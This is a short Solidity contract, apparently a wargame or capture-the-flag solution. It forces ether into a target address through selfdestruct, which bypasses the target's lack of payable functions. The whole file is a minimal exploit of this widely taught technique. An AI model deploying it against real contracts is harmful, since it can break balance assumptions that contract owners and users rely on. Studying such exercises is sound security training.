pragma solidity ^0.8.11;

contract ForceAttack {
    function attack(address payable _force) external payable {
        selfdestruct(_force);
    }

    receive() external payable {}
}
